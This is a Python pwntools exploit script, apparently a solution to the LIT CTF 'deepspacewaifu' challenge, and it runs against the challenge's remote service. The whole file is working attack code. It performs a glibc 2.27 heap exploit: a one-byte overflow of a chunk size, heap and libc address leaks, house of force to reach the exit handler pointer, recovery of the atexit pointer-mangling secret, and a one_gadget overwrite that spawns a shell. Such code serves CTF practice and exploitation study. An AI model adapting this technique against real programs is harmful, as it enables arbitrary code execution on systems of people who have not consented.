from pwn import *

#init 

e = ELF('./deepspacewaifu')
libc = ELF('./libc-2.27.so')

#p = process(e.path)
p = remote('deepspacewaifu.litctf.live', 1337)

#funcs

def add(x):
    p.sendlineafter('?', '1')
    p.sendlineafter('?', str(x))

def fre(x):
    p.sendlineafter('?', '2')
    p.sendlineafter('?', str(x))

def chg(x, s, t = True):
    if t:
        p.sendlineafter('?', '3')
    p.sendlineafter('?', str(x))
    p.sendlineafter('!', s)

def rd(x):
    p.sendlineafter('?', '4')
    p.sendlineafter('?', str(x))
    p.recvuntil('!\n')
    return p.recvline(keepends = False)

rol17 = lambda x : ((x << 17) & (2**64 - 1)) | (x >> 47)
ror17 = lambda x : ((x << 47) & (2**64 - 1)) | (x >> 17)

#vars

dl_fini_off = 0x4019f0
main_arena_off = 0x3ebca0
fini_ptr_off = 0x3ecd98
one_gadget = 0x4f3c2
ugh_off = 0x3ecd80

log.info('Dl fini libc off: ' + hex(dl_fini_off))
log.info('Main arena libc off: ' + hex(main_arena_off))
log.info('Fini ptr libc off: ' + hex(fini_ptr_off))
log.info('One gadget libc off: ' + hex(one_gadget))
log.info('Ugh libc off: ' + hex(ugh_off))

#exploit

#overwrite byte on large chnk size to extend it and create temporary second large chunk for securities

add(0x48) #0
add(0x4f8) #1
add(0x18) #2
add(0x418) #3

chg(0, b'a' * 0x37)
chg(3, p64(0x21) * 0x10)

#free both large chunks so top chnk size can be overwritten by libc pointer after allocating from main arena

fre(1)
fre(3)

add(0x508) #4

#this also gives heap and libc leak

top_chnk = u64(rd(4)[:8]) + 0x520
libc_off = u64(rd(2)[:8]) - main_arena_off

log.info('Top chnk adr: ' + hex(top_chnk))
log.info('Libc off adr: ' + hex(libc_off))

#can now write up to fini ptr using house of force since top chnk overwritten

add(libc_off + fini_ptr_off - top_chnk - 4 * 0x8 - 0x20) #1

#add chunk on fini ptr and leak atexit secret

add(0x58) #3

atexit_secret = ror17(u64(rd(3)[24:32])) ^ (libc_off + dl_fini_off)

log.info('Atexit secret: ' + hex(atexit_secret))

#call exit which will call address at fini ptr which we can mangle then overwite one gadget on

p.sendlineafter('?', '5')
p.sendlineafter('(Y/n)', 'y')

chg(3, p64(libc_off + ugh_off) + p64(1) + p64(0x3) + p64(rol17((libc_off + one_gadget) ^ atexit_secret)), False)

#pray for flag

p.interactive()

